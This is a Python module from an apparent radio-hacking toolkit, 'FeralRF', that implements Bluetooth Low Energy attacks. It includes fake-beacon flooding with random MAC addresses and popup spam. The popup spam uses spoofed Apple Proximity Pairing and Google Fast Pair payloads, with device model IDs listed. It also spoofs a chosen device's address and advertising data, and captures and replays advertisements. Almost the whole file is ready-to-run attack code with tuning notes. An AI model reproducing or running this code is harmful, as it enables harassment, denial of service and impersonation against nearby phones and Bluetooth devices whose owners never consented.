"""
FeralRF - BLE Attack Commands

Attacks using BLE advertising channels (37, 38, 39).
All attacks use ADV_NONCONN_IND PDUs via the existing TX API.

Usage:
    from feralrf import Radio, PHY
    from feralrf.attacks import ble

    radio = Radio('/dev/ttyACM0')
    radio.connect()
    radio.init()

    ble.beacon_flood(radio, names=["Free WiFi", "AirPods"], count=50)
    ble.apple_popup_spam(radio, device='airpods_pro', count=100)
"""

import os
import time
from typing import Optional

from feralrf.enums import PHY
from feralrf.radio import Radio


# ─── Payload Builders ───


def build_adv_payload(name: str, flags: int = 0x06) -> bytes:
    """Build BLE advertising payload with Flags + Complete Local Name."""
    payload = bytearray()
    payload += bytes([0x02, 0x01, flags])
    name_bytes = name.encode("utf-8")[:24]
    payload += bytes([len(name_bytes) + 1, 0x09]) + name_bytes
    return bytes(payload)


# Apple Proximity Pairing models (bytes at device model field)
APPLE_DEVICES = {
    "airpods": (0x01, 0x20),
    "airpods_pro": (0x02, 0x20),
    "airpods_pro_2": (0x0E, 0x20),
    "airpods_max": (0x0A, 0x20),
    "airpods_3": (0x13, 0x20),
    "powerbeats_pro": (0x03, 0x20),
    "beats_fit_pro": (0x12, 0x20),
}

# Google Fast Pair model IDs
GOOGLE_DEVICES = {
    "pixel_buds_pro": 0x2C01A2,
    "galaxy_buds2": 0xCD8256,
    "sony_wh1000xm4": 0x00B727,
    "jbl_flip6": 0x0002F0,
    "pixel_buds_a": 0x0600F0,
}


def build_apple_proximity_payload(model: tuple = (0x02, 0x20)) -> bytes:
    """Build Apple Proximity Pairing payload (triggers iOS popup).

    NOTE: No Flags AD included — adding Flags breaks popup on some devices.
    """
    payload = bytearray()
    payload += bytes([
        0x1A, 0xFF,             # Manufacturer Specific (26 bytes)
        0x4C, 0x00,             # Apple Company ID
        0x07,                   # Proximity Pairing type
        0x19,                   # Length
        0x07,                   # Status flags
        model[0], model[1],     # Device model
        0x75,                   # Status
        0x00,                   # Battery case
    ])
    payload += os.urandom(14)  # Random padding
    return bytes(payload)


def build_google_fastpair_payload(model_id: int = 0x2C01A2) -> bytes:
    """Build Google Fast Pair discoverable payload (triggers Android popup).

    NOTE: No Flags AD included — proven that Flags break the popup trigger.
    Format matches real device captures: [TX_Power][ServiceData(UUID+ModelID)]
    """
    payload = bytearray()
    payload += bytes([0x02, 0x0A, 0xF6])            # TX Power: -10 dBm
    model_bytes = model_id.to_bytes(3, "big")
    payload += bytes([len(model_bytes) + 3, 0x16, 0x2C, 0xFE])  # Service Data header
    payload += model_bytes
    return bytes(payload)


def _random_mac() -> bytes:
    """Generate random BLE address (random static type: 2 MSBs = 11)."""
    addr = bytearray(os.urandom(6))
    addr[5] |= 0xC0  # Set random static address type
    return bytes(reversed(addr))  # Little-endian for firmware


# ─── Attack Functions ───


def beacon_flood(
    radio: Radio,
    names: Optional[list] = None,
    count: int = 50,
    channels: list = [37, 38, 39],
    power_dbm: int = 0,
    interval_us: int = 5000,
) -> dict:
    """Flood BLE advertising channels with fake beacons.

    Each beacon gets a random MAC address, making them appear as
    different devices on BLE scanners.

    Args:
        radio: Connected and initialized Radio instance.
        names: List of device names. Default: common device names.
        count: Number of transmissions per name per channel.
        channels: BLE advertising channels (default: 37, 38, 39).
        power_dbm: TX power in dBm.
        interval_us: Interval between packets in microseconds.

    Returns:
        dict with stats: total_sent, names_used, channels_used.
    """
    if names is None:
        names = [
            "Free WiFi", "AirPods Pro", "Galaxy Buds", "Bose QC45",
            "JBL Flip 6", "AirTag Found", "TV Samsung", "Pixel Buds",
        ]

    total_sent = 0

    for ch in channels:
        radio.set_phy(PHY.BLE_1M, channel=ch)

        for name in names:
            radio.set_ble_addr(_random_mac())
            payload = build_adv_payload(name)
            for _ in range(count):
                radio.transmit(payload, power_dbm=power_dbm)
                if interval_us > 0:
                    time.sleep(interval_us / 1_000_000)
            total_sent += count

    return {"total_sent": total_sent, "names": len(names), "channels": len(channels)}


def apple_popup_spam(
    radio: Radio,
    device: str = "airpods_pro",
    count: int = 100,
    channels: list = [37, 38, 39],
    power_dbm: int = 5,
    interval_us: int = 3000,
) -> dict:
    """Trigger Apple iOS proximity pairing popups.

    Sends Apple Manufacturer Specific advertising data that causes
    iPhones/iPads to show "Not Your [Device]" popups.

    Args:
        radio: Connected and initialized Radio instance.
        device: Apple device to spoof. Options: airpods, airpods_pro,
                airpods_pro_2, airpods_max, airpods_3, powerbeats_pro,
                beats_fit_pro, or "all" to cycle through all.
        count: Number of transmissions per device per channel.
        channels: BLE advertising channels.
        power_dbm: TX power in dBm.
        interval_us: Interval between packets.

    Returns:
        dict with stats.
    """
    if device == "all":
        devices = list(APPLE_DEVICES.keys())
    else:
        devices = [device]

    total_sent = 0

    for ch in channels:
        radio.set_phy(PHY.BLE_1M, channel=ch)

        for dev_name in devices:
            model = APPLE_DEVICES.get(dev_name, (0x02, 0x20))
            radio.set_ble_addr(_random_mac())
            payload = build_apple_proximity_payload(model)
            for _ in range(count):
                radio.transmit(payload, power_dbm=power_dbm)
                if interval_us > 0:
                    time.sleep(interval_us / 1_000_000)
            total_sent += count

    return {"total_sent": total_sent, "devices": devices, "channels": len(channels)}


def google_popup_spam(
    radio: Radio,
    device: str = "pixel_buds_pro",
    count: int = 100,
    channels: list = [37, 38, 39],
    power_dbm: int = 5,
    interval_us: int = 3000,
) -> dict:
    """Trigger Google Fast Pair popups on Android devices.

    Args:
        radio: Connected and initialized Radio instance.
        device: Google Fast Pair device. Options: pixel_buds_pro,
                galaxy_buds2, sony_wh1000xm4, jbl_flip6, pixel_buds_a,
                or "all" to cycle through all.
        count: Number of transmissions per device per channel.
        channels: BLE advertising channels.
        power_dbm: TX power in dBm.
        interval_us: Interval between packets.

    Returns:
        dict with stats.
    """
    if device == "all":
        devices = list(GOOGLE_DEVICES.keys())
    else:
        devices = [device]

    total_sent = 0

    for ch in channels:
        radio.set_phy(PHY.BLE_1M, channel=ch)

        for dev_name in devices:
            model_id = GOOGLE_DEVICES.get(dev_name, 0x2C01A2)
            radio.set_ble_addr(_random_mac())
            payload = build_google_fastpair_payload(model_id)
            for _ in range(count):
                radio.transmit(payload, power_dbm=power_dbm)
                if interval_us > 0:
                    time.sleep(interval_us / 1_000_000)
            total_sent += count

    return {"total_sent": total_sent, "devices": devices, "channels": len(channels)}


def adv_spoof(
    radio: Radio,
    target_addr: str,
    adv_data: bytes,
    count: int = 100,
    channel: int = 37,
    power_dbm: int = 0,
    interval_us: int = 5000,
) -> dict:
    """Spoof a BLE device's advertising data.

    Args:
        radio: Connected and initialized Radio instance.
        target_addr: MAC to spoof as "AA:BB:CC:DD:EE:FF".
        adv_data: Raw advertising payload bytes to transmit.
        count: Number of transmissions.
        channel: BLE advertising channel.
        power_dbm: TX power.
        interval_us: Interval between packets.

    Returns:
        dict with stats.
    """
    radio.set_phy(PHY.BLE_1M, channel=channel)
    radio.set_ble_addr_str(target_addr)
    for _ in range(count):
        radio.transmit(adv_data, power_dbm=power_dbm)
        if interval_us > 0:
            time.sleep(interval_us / 1_000_000)

    return {"total_sent": count, "spoofed_addr": target_addr}


def capture_and_replay(
    radio: Radio,
    capture_seconds: float = 10.0,
    replay_count: int = 5,
    channel: int = 37,
    target_name: Optional[str] = None,
    power_dbm: int = 0,
) -> dict:
    """Capture BLE advertisements then replay them.

    Args:
        radio: Connected and initialized Radio instance.
        capture_seconds: How long to capture.
        replay_count: How many times to replay each captured packet.
        channel: BLE advertising channel.
        target_name: Optional filter — only capture packets containing this name.
        power_dbm: TX power for replay.

    Returns:
        dict with captured count and replay stats.
    """
    radio.set_phy(PHY.BLE_1M, channel=channel)
    radio.set_adv_hop(True)
    radio.start_rx()

    captured = []
    for pkt in radio.read_packets(timeout=capture_seconds):
        if pkt.crc_ok and len(pkt.data) > 8:
            if target_name is None or target_name.encode() in pkt.data:
                captured.append(pkt.data)

    radio.stop_rx()
    time.sleep(0.3)

    replayed = 0
    if captured:
        radio.set_adv_hop(False)
        radio.set_phy(PHY.BLE_1M, channel=channel)

        for pkt_data in captured:
            # Extract ADV payload (skip PDU header + 6-byte addr)
            # Layout: [PDU type+len (2B)][AdvA (6B)][AdvData...]
            if len(pkt_data) > 8:
                adv_payload = pkt_data[8:]
                for _ in range(replay_count):
                    radio.transmit(adv_payload, power_dbm=power_dbm)
                    time.sleep(0.02)
                    replayed += 1

    return {"captured": len(captured), "replayed": replayed}
